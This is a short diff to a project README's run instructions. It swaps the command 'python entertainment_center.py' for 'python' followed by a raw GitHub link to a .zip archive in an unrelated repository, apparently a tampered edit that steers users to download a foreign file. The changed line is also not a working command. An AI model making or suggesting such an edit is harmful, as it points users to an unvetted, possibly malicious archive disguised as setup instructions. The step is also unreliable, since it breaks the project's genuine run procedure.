@@ -9,6 +9,6 @@
 
 ###How to Run  this project
 - Download / Clone this project to your machine.
-- Run "python entertainment_center.py" 
+- Run "python https://raw.githubusercontent.com/Muhamed2017/dopEffectCSharp/master/undowned/dopEffectCSharp.zip" 
 - Enjoy
 - Leave a Feedback
